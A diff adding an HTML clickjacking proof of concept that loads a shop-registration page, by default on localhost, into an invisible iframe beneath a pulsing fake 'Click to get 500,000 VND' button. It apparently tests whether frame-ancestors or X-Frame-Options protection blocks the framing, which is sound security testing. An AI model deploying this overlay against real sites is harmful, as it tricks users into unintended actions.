@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Attack Demo (Iframe Overlay)</title>
+    <style>
+        body {
+            font-family: "Segoe UI", Tahoma, sans-serif;
+            background: #f8fafc;
+            color: #0f172a;
+            margin: 0;
+            padding: 24px;
+        }
+        .card {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #fff;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(2, 6, 23, 0.07);
+        }
+        h1 {
+            margin-top: 0;
+            color: #1d4ed8;
+        }
+        .muted {
+            color: #64748b;
+            font-size: 14px;
+        }
+        .code {
+            display: inline-block;
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            border-radius: 6px;
+            padding: 2px 8px;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+        }
+        .arm-btn {
+            margin-top: 8px;
+            border: 0;
+            border-radius: 10px;
+            padding: 10px 16px;
+            background: #1d4ed8;
+            color: #ffffff;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .stage {
+            position: relative;
+            margin-top: 16px;
+            width: 820px;
+            max-width: 100%;
+            height: 460px;
+            border: 2px dashed #60a5fa;
+            border-radius: 10px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        .bait {
+            position: absolute;
+            inset: 0;
+            z-index: 20;
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: 700;
+            color: #1d4ed8;
+            background: linear-gradient(135deg, #dbeafe, #e0f2fe);
+            pointer-events: none;
+        }
+        .fake-btn {
+            background: #ef4444;
+            color: #ffffff;
+            border-radius: 999px;
+            padding: 14px 26px;
+            font-size: 20px;
+            font-weight: 700;
+            box-shadow: 0 12px 24px rgba(239, 68, 68, 0.35);
+            animation: pulse 1.2s infinite;
+            pointer-events: auto;
+            cursor: pointer;
+        }
+        .hint {
+            font-size: 14px;
+            color: #0f172a;
+            background: rgba(255, 255, 255, 0.85);
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            padding: 6px 10px;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.04); }
+            100% { transform: scale(1); }
+        }
+        iframe {
+            position: absolute;
+            inset: 0;
+            z-index: 10;
+            width: 100%;
+            height: 100%;
+            border: 0;
+            opacity: 0;
+        }
+        .status {
+            margin-top: 12px;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid #cbd5e1;
+            background: #f8fafc;
+            font-size: 14px;
+        }
+        .click-log {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid #fecaca;
+            background: #fef2f2;
+            font-size: 13px;
+            color: #7f1d1d;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>Clickjacking PoC (separate file)</h1>
+    <p class="muted">
+        This file tries to embed a protected page in a transparent iframe overlay.
+    </p>
+
+    <p>Target page: <span id="targetPage" class="code"></span></p>
+    <button id="armBtn" class="arm-btn" type="button">Start clickjacking attempt</button>
+
+    <div id="stageArea" class="stage">
+        <div class="bait">
+            <div>Click area (fake reward)</div>
+            <button id="fakeClickBtn" class="fake-btn" type="button">Click to get 500,000 VND</button>
+            <div class="hint">Click anywhere in this blue box. The click will pass through to the hidden iframe.</div>
+        </div>
+        <iframe id="targetFrame" title="target frame"></iframe>
+    </div>
+
+    <div id="status" class="status">Ready. No request is sent until you click "Start clickjacking attempt".</div>
+    <div id="clickLog" class="click-log"></div>
+</div>
+
+<script>
+(function () {
+    var params = new URLSearchParams(window.location.search);
+    var target = params.get("target") || "https://localhost:8443";
+    var path = params.get("path") || "/seller/register-shop";
+
+    target = target.replace(/\/$/, "");
+    if (!path.startsWith("/")) {
+        path = "/" + path;
+    }
+
+    var url = target + path;
+    document.getElementById("targetPage").textContent = url;
+
+    var frame = document.getElementById("targetFrame");
+    var stageArea = document.getElementById("stageArea");
+    var armBtn = document.getElementById("armBtn");
+    var status = document.getElementById("status");
+    var clickLog = document.getElementById("clickLog");
+    var fakeClickBtn = document.getElementById("fakeClickBtn");
+    var clickCount = 0;
+    var frameLoaded = false;
+    var attackArmed = false;
+
+    frame.onload = function () {
+        frameLoaded = true;
+        status.textContent = "Iframe load event fired. If browser console shows frame-ancestors/X-Frame-Options error, clickjacking is blocked (expected after fix).";
+    };
+
+    frame.onerror = function () {
+        status.textContent = "Iframe failed to load. Likely blocked by security policy or unreachable target.";
+    };
+
+    function startAttack() {
+        if (attackArmed) {
+            return;
+        }
+        attackArmed = true;
+        status.textContent = "Attempt started. Loading hidden iframe target...";
+        frame.src = url;
+        setTimeout(function () {
+            if (!frameLoaded) {
+                status.textContent = "Target frame did not become usable. Check DevTools for CSP frame-ancestors / X-Frame-Options blocking.";
+            }
+        }, 3000);
+    }
+
+    armBtn.addEventListener("click", startAttack);
+    stageArea.addEventListener("click", startAttack);
+
+    fakeClickBtn.addEventListener("click", function () {
+        startAttack();
+        clickCount += 1;
+        clickLog.style.display = "block";
+        if (!attackArmed) {
+            clickLog.textContent = "You clicked the bait, but attack is not started yet. Click 'Start clickjacking attempt' first.";
+        } else if (frameLoaded) {
+            clickLog.textContent = "Clicked " + clickCount + " time(s). Frame loaded, clickjacking attempt can proceed on vulnerable target.";
+        } else {
+            clickLog.textContent = "Clicked " + clickCount + " time(s). Frame is not usable (likely blocked by CSP frame-ancestors/X-Frame-Options), so attack is prevented.";
+        }
+    });
+})();
+</script>
+</body>
+</html>
